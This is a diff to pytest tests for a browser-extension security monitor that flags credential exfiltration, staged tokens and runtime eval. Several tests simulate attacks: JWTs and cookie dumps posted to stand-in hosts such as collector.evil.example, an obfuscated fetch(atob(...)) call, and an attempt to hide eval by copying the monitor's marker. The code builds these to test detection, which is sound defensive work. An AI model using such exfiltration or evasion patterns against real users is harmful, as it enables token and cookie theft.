@@ -9,6 +9,7 @@
 # are tested directly with mocked requests.
 
 import asyncio
+import base64
 import json
 import time
 from unittest.mock import MagicMock, patch
@@ -407,6 +408,74 @@ class TestRule02CredentialExfil:
         assert [a for a in _drain(alert_queue) if a["rule"] == "RULE-02"] == []
 
 
+def _jwt(claims: dict) -> str:
+    """An unsigned-looking JWT with the given payload claims."""
+
+    def part(obj):
+        return base64.urlsafe_b64encode(json.dumps(obj).encode()).decode().rstrip("=")
+
+    return f"{part({'alg': 'RS256', 'typ': 'JWT'})}.{part(claims)}.c2lnbmF0dXJlLXZhbHVl"
+
+
+async def _rule02(url, body="", headers=None, fake_target=None, alert_queue=None):
+    await bm._handle_network_request(_post(url, body, headers), fake_target, "ext", alert_queue)
+    return [a for a in _drain(alert_queue) if a["rule"] == "RULE-02"]
+
+
+class TestRule02Jwt:
+    """
+    Real-extension test: Grammarly sent its own login JWT to its own API
+    (gateway.grammarly.com) and got four "credential sent to a third-party
+    host" alerts. A JWT names its home in the iss / aud claims.
+    """
+
+    GRAMMARLY = {"iss": "https://auth.grammarly.com", "sub": "u1", "exp": 4102444800}
+
+    @pytest.mark.asyncio
+    async def test_own_token_to_own_service_is_normal(self, fake_target, alert_queue):
+        headers = {"Authorization": "Bearer " + _jwt(self.GRAMMARLY)}
+        assert await _rule02("https://gateway.grammarly.com/x", "", headers,
+                             fake_target, alert_queue) == []  # fmt: skip
+
+    @pytest.mark.asyncio
+    async def test_same_token_sent_elsewhere_is_exfil(self, fake_target, alert_queue):
+        body = json.dumps({"stolen": _jwt(self.GRAMMARLY)})
+        alerts = await _rule02("https://collector.evil.example/u", body, None,
+                               fake_target, alert_queue)  # fmt: skip
+        assert alerts and "JWT" in alerts[0]["detail"]["credentials"]
+
+    @pytest.mark.asyncio
+    async def test_token_forwarded_as_header_to_another_site(self, fake_target, alert_queue):
+        headers = {"Authorization": "Bearer " + _jwt(self.GRAMMARLY)}
+        alerts = await _rule02("https://evil.example/api", "", headers, fake_target, alert_queue)
+        assert alerts
+
+    @pytest.mark.asyncio
+    async def test_audience_also_counts_as_home(self, fake_target, alert_queue):
+        token = _jwt({"iss": "https://login.example-idp.com", "aud": ["api.myservice.co.uk"]})
+        headers = {"Authorization": "Bearer " + token}
+        assert await _rule02("https://eu.myservice.co.uk/v1", "", headers,
+                             fake_target, alert_queue) == []  # fmt: skip
+
+    @pytest.mark.asyncio
+    async def test_token_without_issuer_is_normal_as_bearer(self, fake_target, alert_queue):
+        headers = {"Authorization": "Bearer " + _jwt({"sub": "u1", "exp": 1})}
+        assert await _rule02("https://api.example.com/v1", "", headers,
+                             fake_target, alert_queue) == []  # fmt: skip
+
+    @pytest.mark.asyncio
+    async def test_token_without_issuer_in_body_is_flagged(self, fake_target, alert_queue):
+        body = "t=" + _jwt({"sub": "u1", "exp": 1})
+        assert await _rule02("https://evil.example/c", body, None, fake_target, alert_queue)
+
+    def test_site_handles_two_part_suffixes(self):
+        assert bm._site("a.b.example.co.uk") == "example.co.uk"
+        assert bm._site("gateway.grammarly.com") == "grammarly.com"
+
+    def test_garbage_jwt_payload_names_no_host(self):
+        assert bm._jwt_claim_hosts("eyJhbGciOi.eyJ!!!notbase64.sig") == set()
+
+
 class TestAuthenticatedRequests:
     @pytest.mark.asyncio
     async def test_state_changing_request_with_session_is_session_riding(
@@ -664,13 +733,45 @@ class TestHookEvents:
             {
                 "area": "local",
                 "keys": ["s_cache"],
-                "size": 400,
-                "sample": '{"s_cache":"' + "QUJD" * 60 + '"}',
+                "size": 1300,
+                "sample": '{"s_cache":"' + "QUJD" * 300 + '"}',
             },
             fake_target,
             alert_queue,
         )
-        assert alerts[0]["rule"] == "RULE-04" and alerts[0]["severity"] == "high"
+        # A blob on its own is a weak signal: medium (credentials make it critical)
+        assert alerts[0]["rule"] == "RULE-04" and alerts[0]["severity"] == "medium"
+
+    @pytest.mark.asyncio
+    async def test_small_encoded_values_ignored(self, fake_target, alert_queue):
+        """Encrypted vault entries, hashes, IDs: base64, but not staged data."""
+        sample = '{"vault":"2.' + "QUJD" * 150 + "|" + "WFla" * 20 + '"}'
+        assert await _hook("storage.set", {"size": len(sample), "sample": sample},
+                           fake_target, alert_queue) == []  # fmt: skip
+
+    @pytest.mark.asyncio
+    async def test_cached_image_data_url_ignored(self, fake_target, alert_queue):
+        """Real-extension test: Dark Reader caches image details in localStorage."""
+        sample = '{"src":"x.svg","dataURL":"data:image/svg+xml;base64,' + "PHN2" * 400 + '"}'
+        assert await _hook("localStorage.setItem", {"size": len(sample), "sample": sample},
+                           fake_target, alert_queue) == []  # fmt: skip
+
+    @pytest.mark.asyncio
+    async def test_extension_storing_its_own_login_token_is_normal(self, fake_target, alert_queue):
+        """Real-extension test: Grammarly keeps its OAuth JWT in chrome.storage."""
+        token = _jwt({"iss": "https://auth.grammarly.com", "sub": "u" * 900})
+        sample = json.dumps({"gr-oauth-key": token})
+        assert await _hook("storage.set", {"size": len(sample), "sample": sample},
+                           fake_target, alert_queue) == []  # fmt: skip
+
+    @pytest.mark.asyncio
+    async def test_staging_a_google_identity_token_is_critical(self, fake_target, alert_queue):
+        token = _jwt({"iss": "https://accounts.google.com", "aud": "x.apps.googleusercontent.com"})
+        sample = json.dumps({"loot": token})
+        alerts = await _hook("storage.set", {"size": len(sample), "sample": sample},
+                             fake_target, alert_queue)  # fmt: skip
+        assert alerts[0]["severity"] == "critical"
+        assert "high-value identity provider" in alerts[0]["detail"]["description"]
 
     @pytest.mark.asyncio
     async def test_storage_staging_credentials_is_critical(self, fake_target, alert_queue):
@@ -785,10 +886,12 @@ EXT = "c" * 32
 class FakeSocket:
     """Records sent commands; replies to some methods, never to others."""
 
-    def __init__(self, monitor_ref, silent=("Runtime.addBinding",)):
+    def __init__(self, monitor_ref, silent=("Runtime.addBinding",), ext_name="Test Extension"):
         self.sent = []
         self.monitor_ref = monitor_ref
         self.silent = set(silent)
+        self.ext_name = ext_name
+        self.script_sources = {}  # scriptId -> source, for Debugger.getScriptSource
 
     async def send(self, raw):
         msg = json.loads(raw)
@@ -796,8 +899,13 @@ class FakeSocket:
         if msg["method"] in self.silent:
             return  # like a paused worker: no reply until it runs
         result = {}
+        if msg["method"] == "Debugger.getScriptSource":
+            result = {"scriptSource": self.script_sources.get(msg["params"]["scriptId"], "")}
         if msg["method"] == "Runtime.evaluate":
-            result = {"result": {"value": "installed"}}
+            if "getManifest" in msg["params"].get("expression", ""):
+                result = {"result": {"value": self.ext_name}}  # the name lookup
+            else:
+                result = {"result": {"value": "installed"}}  # the hook install
         if msg["method"] == "Debugger.setInstrumentationBreakpoint":
             result = {"breakpointId": "bp-1"}
         future = self.monitor_ref[0]._pending.get(msg["id"])
@@ -1002,3 +1110,196 @@ class TestExtensionMonitor:
             a = mon.alert_queue.get_nowait()
             rules.append((a["rule"], a["severity"]))
         assert ("RULE-03", "high") in rules
+
+
+# ---------------------------------------------------------------------------
+# run_monitor shutdown (real-extension test: Chrome for Testing closing)
+# ---------------------------------------------------------------------------
+
+
+class _FakeConnection:
+    async def __aenter__(self):
+        return object()
+
+    async def __aexit__(self, *exc):
+        return False
+
+
+class TestRunMonitorShutdown:
+    """
+    With --output-json, stdout IS the alert stream extguard-dispatch reads.
+    Closing the browser at the end of a --once run printed
+    "[ERROR] no close frame received or sent" into it and exited 1.
+    """
+
+    @pytest.mark.asyncio
+    async def test_browser_closing_after_a_session_is_a_clean_end(self, monkeypatch, capsys):
+        class ClosingMonitor:
+            def __init__(self, ws, alert_queue, *args):
+                self.alert_queue = alert_queue
+
+            async def run(self):
+                # An alert raised just before Chrome went away must still print
+                await self.alert_queue.put({"rule": "RULE-01", "severity": "high"})
+                raise bm.websockets.exceptions.ConnectionClosedError(None, None)
+
+        monkeypatch.setattr(bm, "get_browser_ws_url", lambda: "ws://127.0.0.1:9/devtools")
+        monkeypatch.setattr(bm.websockets, "connect", lambda *a, **k: _FakeConnection())
+        monkeypatch.setattr(bm, "ExtensionMonitor", ClosingMonitor)
+
+        await bm.run_monitor(None, output_json=True, once=True)  # must not raise
+
+        out, err = capsys.readouterr()
+        lines = [line for line in out.splitlines() if line.strip()]
+        assert [json.loads(line)["rule"] for line in lines] == ["RULE-01"]
+        assert "no close frame" in err and "closed the connection" in err
+
+    @pytest.mark.asyncio
+    async def test_chrome_never_reachable_is_still_an_error(self, monkeypatch, capsys):
+        def unreachable():
+            raise RuntimeError("Cannot connect to Chrome at 127.0.0.1:9222")
+
+        monkeypatch.setattr(bm, "get_browser_ws_url", unreachable)
+        with pytest.raises(RuntimeError, match="Chrome not reachable"):
+            await bm.run_monitor(None, output_json=True, once=True)
+        assert capsys.readouterr().out == ""
+
+
+# ---------------------------------------------------------------------------
+# Extension names in alerts (real-extension test: alerts only showed
+# "Service Worker chrome-extension://dmkbhg..." - or a web page's title)
+# ---------------------------------------------------------------------------
+
+
+async def _settle():
+    for _ in range(5):
+        await asyncio.sleep(0)
+
+
+class TestExtensionNames:
+    @pytest.mark.asyncio
+    async def test_worker_alert_carries_the_extension_name(self):
+        mon, _ = _monitor()
+        await mon.dispatch(
+            _attached("S1", "service_worker", f"chrome-extension://{EXT}/sw.js", waiting=False)
+        )
+        await _settle()
+        assert mon.ext_names[EXT] == "Test Extension"
+
+        await mon.dispatch(
+            {
+                "method": "Network.requestWillBeSent",
+                "sessionId": "S1",
+                "params": {
+                    "requestId": "r1",
+                    "request": {"url": "https://x.workers.dev/c", "method": "POST"},
+                },
+            }
+        )
+        ext = mon.alert_queue.get_nowait()["extension"]
+        assert ext["name"] == ext["title"] == "Test Extension"
+        assert ext["id"] == EXT and ext["target_title"] == "T"
+
+    @pytest.mark.asyncio
+    async def test_content_script_alert_names_the_extension_not_the_page(self):
+        mon, _ = _monitor()
+        await mon.dispatch(
+            _attached("S1", "service_worker", f"chrome-extension://{EXT}/sw.js", waiting=False)
+        )
+        await mon.dispatch(_attached("P1", "page", "https://github.com/", waiting=False))
+        await _settle()
+        initiator = {
+            "type": "script",
+            "stack": {"callFrames": [{"url": f"chrome-extension://{EXT}/cs.js"}]},
+        }
+        await mon.dispatch(
+            {
+                "method": "Network.requestWillBeSent",
+                "sessionId": "P1",
+                "params": {
+                    "requestId": "r1",
+                    "initiator": initiator,
+                    "request": {
+                        "url": "https://drop.evil.example/c",
+                        "method": "POST",
+                        "postData": COOKIE_DUMP,
+                    },
+                },
+            }
+        )
+        ext = mon.alert_queue.get_nowait()["extension"]
+        assert ext["context"] == "content_script"
+        assert ext["title"] == "Test Extension"
+
+    @pytest.mark.asyncio
+    async def test_name_is_a_sanitised_label(self):
+        holder = []
+        ws = FakeSocket(holder, ext_name="Evil\x1b[31m\nName" + "x" * 300)
+        mon = bm.ExtensionMonitor(ws, asyncio.Queue(), output_json=True)
+        holder.append(mon)
+        await mon.dispatch(
+            _attached("S1", "service_worker", f"chrome-extension://{EXT}/sw.js", waiting=False)
+        )
+        await _settle()
+        name = mon.ext_names[EXT]
+        assert "\x1b" not in name and "\n" not in name and len(name) <= 120
+
+    def test_unknown_name_falls_back_without_using_the_page_title(self):
+        worker = {"_ext_id": EXT, "title": "Service Worker x", "_context": "extension"}
+        in_page = {"_ext_id": EXT, "title": "Some Web Page", "_context": "content_script"}
+        assert bm._make_alert("RULE-01", "high", worker, {})["extension"]["title"] == (
+            "Service Worker x"
+        )
+        assert bm._make_alert("RULE-01", "high", in_page, {})["extension"]["title"] is None
+
+
+class TestOwnScriptsAndRule06:
+    """
+    RULE-06 alerts on code compiled at runtime (a script with no URL). The
+    monitor's own injected scripts must not count - and an extension must
+    not be able to hide its eval() by copying a marker it can see.
+    """
+
+    async def _parsed(self, source):
+        mon, ws = _monitor()
+        await mon.dispatch(
+            _attached("S1", "service_worker", f"chrome-extension://{EXT}/sw.js", waiting=False)
+        )
+        await _settle()
+        while not mon.alert_queue.empty():
+            mon.alert_queue.get_nowait()
+        entry = mon.sessions["S1"]
+        ws.script_sources["sc1"] = source(entry) if callable(source) else source
+        await mon.dispatch(
+            {
+                "method": "Debugger.scriptParsed",
+                "sessionId": "S1",
+                "params": {"scriptId": "sc1", "url": ""},
+            }
+        )
+        return [a for a in _drain(mon.alert_queue) if a["rule"] == "RULE-06"]
+
+    @pytest.mark.asyncio
+    async def test_monitors_own_name_lookup_is_not_an_eval_alert(self):
+        """Real-extension re-test: every extension got RULE-06 for this."""
+        alerts = await self._parsed(
+            lambda e: bm._tag_own_script(bm.EXTENSION_NAME_SCRIPT, e["own_url"])
+        )
+        assert alerts == []
+
+    @pytest.mark.asyncio
+    async def test_monitors_own_hook_is_not_an_eval_alert(self):
+        alerts = await self._parsed(
+            lambda e: bm.build_hook_script(e["binding"], e["token"], e["mark"], e["own_url"])
+        )
+        assert alerts == []
+
+    @pytest.mark.asyncio
+    async def test_extension_eval_is_an_alert(self):
+        assert await self._parsed("fetch(atob('aHR0cHM6Ly9ldmls'))")
+
+    @pytest.mark.asyncio
+    async def test_copying_the_visible_marker_does_not_hide_eval(self):
+        """MARK is a property on globalThis - any extension can read it."""
+        alerts = await self._parsed(lambda e: f"/*{e['mark']}*/ fetch(atob('aHR0cHM6Ly9ldmls'))")
+        assert alerts
